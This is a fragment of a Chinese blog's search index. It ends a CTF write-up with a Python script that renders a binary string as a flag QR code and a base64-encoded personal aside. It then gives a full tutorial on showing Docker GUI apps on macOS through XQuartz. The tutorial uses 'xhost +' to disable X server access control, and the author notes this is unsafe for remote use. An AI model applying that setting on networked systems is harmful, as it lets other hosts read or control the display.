class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">MAX = <span class="number">256</span></span><br><span class="line"></span><br><span class="line">pic = Image.new(<span class="string">"RGB"</span>,(MAX, MAX))</span><br><span class="line"></span><br><span class="line">str = <span class="string">''</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'./bin.txt'</span>) <span class="keyword">as</span> f:</span><br><span class="line">str = f.read()</span><br><span class="line"></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> range (<span class="number">0</span>,MAX):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range (<span class="number">0</span>,MAX):</span><br><span class="line">        <span class="keyword">if</span>(str[i] == <span class="string">'1'</span>):</span><br><span class="line">            pic.putpixel([x,y],(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            pic.putpixel([x,y],(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))</span><br><span class="line">        i = i+<span class="number">1</span></span><br><span class="line"></span><br><span class="line">pic.show()</span><br><span class="line">pic.save(<span class="string">"flag.png"</span>)</span><br></pre></td></tr></table></figure><p>扫描二维码即可获取 Flag。</p><h1 id="0x3-总结"><a href="#0x3-总结" class="headerlink" title="0x3 总结"></a>0x3 总结</h1><p>本文记录了本次招新赛中的部分题目，其他的题目因为难以复现而暂时无法记录。</p><p>技术上的话题就到此为止了，下面是一些题外话：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">5Zug5Li65piv56ys5LiA5qyh5YGaIGN0Zu+8jOaJgOS7peinieW+l+aXoOiuuuWmguS9lemDveimgeWGmeS4gOS6m+S4nOilv++8jOWPr+iDveaYr+S9nOS4uuaWsOaWueWQkeeahOi1t+eCue+8jOS5n+WPr+iDveaYr+S4uuS6huaWueS+v+aXpeWQjueahOWbnuW/huOAggoK5pyA6L+R6YGH5Yiw5LqG5ZCE56eN5LqL5oOF77yM55Sx5q2k5Lmf5oOz5LqG5b6I5aSa44CC5bCx5Zyo5LiK5Liq5a2m5pyf77yM5oiR5Zug5Li65b2T5pe255y85YWJ5q+U6L6D55+t5rWF6ICM5ouS57ud5LqG5LiA5Liq5py65Lya77yM5rKh5oOz5Yiw6L+Z5a2m5pyf5Y205Zug5q2k6ZSZ6L+H5LqG5b6I5aSa5LqL5oOF44CC5a+55LqO6L+Z5Lu25LqL77yM6K+05LiN5ZCO5oKU5piv5LiN5Y+v6IO955qE77yM5L2G5oiR5Y+I5LiN5piv5LiA5Liq5Lya55So6L+H5Y675Y+N5aSN5oqY56Oo6Ieq5bex55qE5Lq677yM6YCJ6ZSZ5LqG5bCx5piv6YCJ6ZSZ5LqG77yM5Lmf5rKh5LuA5LmI5aW96K+055qE44CCCgrog73lpJ/ov5vlhaUgTkVYIOaYr+aIkeayoeacieaDs+WIsOeahO+8jOi/meS5n+iuuOaYr+WPpuS4gOS4quacuuS8muOAguS4jeeuoeaAjuS5iOivtO+8jOWug+S7juWPpuS4gOS4quWxgumdouiuqeaIkeeci+WIsOS6huW+iOWkmuS4nOilv++8jOi/meS+v+Wkn+S6huOAggoK6LCo5Lul5q2k5paH6K2m6YaS5pyq5p2l55qE6Ieq5bex44CC</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>在 Docker for MacOS 中运行 GUI 程序</title>
      <link href="/2019/10/14/Run-GUI-in-Docker/"/>
      <url>/2019/10/14/Run-GUI-in-Docker/</url>
      
        <content type="html"><![CDATA[<p>内容包括：前言+环境+具体操作+原理</p><a id="more"></a><h1 id="0x0-前言"><a href="#0x0-前言" class="headerlink" title="0x0 前言"></a>0x0 前言</h1><p>在初步接触了 Docker 后，突然萌生了一个“可不可以在其中跑GUI程序的念头”，遂急忙STFW&amp;&amp;RTFM，并在查阅了相关的一些文档后，成功在本地运行了容器内的GUI测试程序，下面记录一下相关的工作和原理。</p><h1 id="0x1-相关环境"><a href="#0x1-相关环境" class="headerlink" title="0x1 相关环境"></a>0x1 相关环境</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Docker version 18.09.2</span><br><span class="line">XQuartz 2.7.11（xorg-server 1.18.4)</span><br></pre></td></tr></table></figure><p>以上软件均可通过 <a href="https://brew.sh" target="_blank" rel="noopener">homebrew</a> 进行安装</p><h1 id="0x2-具体操作"><a href="#0x2-具体操作" class="headerlink" title="0x2 具体操作"></a>0x2 具体操作</h1><ol><li>XQuartz -&gt; 偏好设置 -&gt; 安全性 -&gt; 勾选“允许从网络客户端连接” -&gt; 退出程序；</li><li>终端键入 <code>xhost +</code>（注意两者之间的空格）重新启动 XQuartz；</li><li>使用诸如 <code>nmap</code> 类的工具查看 6000 端口是否被 X11 服务占用，如果已经被占用即可继续下一步操作，如果没有被占用的话…因为没遇到过所以我也不知道怎么办:-P；</li><li>在 run 或 exec 容器时加入<code>-e DISPLAY=host.docker.internal:0</code>参数，比如我这里通过对一个现有的，已经安装过 xarclock 时钟小程序的容器 toyOS 执行<code>docker exec -ite DISPLAY=host.docker.internal:0 toyOS /usr/bin/xarclock</code>，就会在我的本地出现一个小时钟的GUI程序；</li></ol><h1 id="0x3-相关原理"><a href="#0x3-相关原理" class="headerlink" title="0x3 相关原理"></a>0x3 相关原理</h1><p>在 Linux 系统及一些 Unix-like 系统中，有着 <a href="http://linfo.org/x.html" target="_blank" rel="noopener">X Window System</a> 的概念（下面简称为 X系统），用户的 GUI 程序作为 X Client 向本地或远程的 X Server 交互，以得到底层的支持来在运行 X Server 的设备上绘制出图像，而 <a href="https://www.xquartz.org" target="_blank" rel="noopener">XQuartz</a> 则是一款面向 MacOS 系统的 X系统，（在我理解的层面上）也提供了如上的功能支持。</p><p>于是在这个原理的支撑下，<strong>如何让 Docker 运行 GUI 程序</strong> 这个问题就被转化成了 <strong>如何在宿主机运行 X Server</strong> 以及 <strong>如何让 Docker 中的 X Client  与宿主机的 X Server 实现交互</strong>，下面分别来解决这两个问题：</p><h2 id="0x31-如何在宿主机运行-X-Server"><a href="#0x31-如何在宿主机运行-X-Server" class="headerlink" title="0x31 如何在宿主机运行 X Server"></a>0x31 如何在宿主机运行 X Server</h2><p>在 X系统的定义中可以看到，本身该系统就可以支持以网络为基础的 C-S 模型（虽然关注点更倾向于服务方），XQuartz 作为它的一种实现当然也不例外。但是出于<a href="https://security.stackexchange.com/questions/14815/security-concerns-with-x11-forwarding" target="_blank" rel="noopener">安全上的考虑</a>，XQuartz 默认是不允许通过网络进行交互的。要关闭这个限制，有两个方面要实现，分别对应 <strong>具体操作</strong> 中的1，2两个操作，第一个操作就像字面上的意思一样，关闭了网络连接限制，第二个操作则是关闭了连接鉴定（access control），可以通过运行 <code>man xhost</code> 来查看其 Man Page 以获得更多的信息。需要注意的是，因为本次实验的操作都是在本地实现的，所以完全关闭了连接鉴定，这在涉及到远程操作时是非常不安全的。</p><p>执行了上述步骤且 6000 端口被监听（默认情况）时，我们就成功在宿主机上运行起了 X Server，接下来就要解决第三个问题了。</p><h2 id="0x32-如何让-Docker-中的-X-Client-与宿主机的-X-Server-实现交互"><a href="#0x32-如何让-Docker-中的-X-Client-与宿主机的-X-Server-实现交互" class="headerlink" title="0x32 如何让 Docker 中的 X Client  与宿主机的 X Server 实现交互"></a>0x32 如何让 Docker 中的 X Client  与宿主机的 X Server 实现交互</h2><p>作为 X Client 的程序如果想与 X Server 进行交互，大致分为两种方式：</p><ul><li>在命令后加 <code>--display</code> 参数并指明相关的位置</li><li>用户提前设置好环境变量 <code>DISPLAY</code> ，程序从该变量获得相关信息</li></ul><p>这里我们采用第二种方式，故在启动容器时通过 <code>-e</code> 参数为其设置 <code>DISPLAY</code> 变量，现在的问题在于，如何解释变量的值 <code>host.docker.internal:0</code> 呢？</p><p>对于该变量中，冒号前面的部分，<a href="https://docs.docker.com/docker-for-windows/networking/" target="_blank" rel="noopener">Docker 官方文档</a>中有如下解释：</p><blockquote><p>The host has a changing IP address (or none if you have no network access). From 18.03 onwards our recommendation is to connect to the special DNS name <code>host.docker.internal</code>, which resolves to the internal IP address used by the host. </p></blockquote><p>也就是说，这个值本质上是获得了宿主机的内部IP，为了验证这一点，可以通过 <code>ifconfig</code> 命令来查看宿主机实际的IP，并将 <code>DISPLAY</code> 的值换成 <code>your_ip:0</code> ，可以发现和前面一样可以运行。之所以本次实验采用了前者，是因为要获取实际IP，第一是过程很麻烦，第二是设备要处于联网的状态下，而在文档的描述中可以看到 <code>(or none if you have no network access)</code> 这句话，也就是说，这种参数设置在无网络的条件下也可以正常运行。</p><p>那么 <code>DISPLAY</code> 的值就可以被解释为 <code>your_ip:0</code> 了，关于这个格式，其实它的完整形式为 <code>your_ip: display_number. screen_number</code> ，在本实验中其实可以写为 <code>host.docker.internal:0.0</code>，<code>display_number</code> 和 <code>screen_number</code> 均从0开始计数，前者表示一个输入流的标号（输入流包括显示器，键盘，鼠标等），后者表示输入流中某个具体的显示屏，因为很少有人使用多屏幕，所以 <code>screen_number</code> 多数情况下均为0，也就可以省略掉了。</p><p>而对于 <code>display_number</code>，<a href="https://www.x.org/releases/X11R7.7/doc/xproto/x11protocol.html" target="_blank" rel="noopener">X11 protocol 官方文档</a>中有如下描述：</p><blockquote><p>For TCP connections, displays on a given host are numbered starting from 0, and the server for display N listens and accepts connections on port 6000 + N.</p></blockquote><p>也就是说，这个值实际上取决于宿主机上 X11 服务占用的端口，用端口号减掉6000即可，这就是上述命令中冒号后面的0的具体含义。为了验证这一点，可以使用 <code>socat</code> 工具运行 <code>socat tcp-listen:6100,reuseaddr,fork tcp:localhost:6000</code> 命令，将6100端口的消息转交给6000端口，这样按照上面的描述，<code>DISPLAY</code> 变量的值就可以为 <code>host.docker.internal:100</code> ，替换后执行完整命令，可以发现一样能运行GUI测试程序。</p>]]></content>
      
      
      <categories>
          
          <category> Docker </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
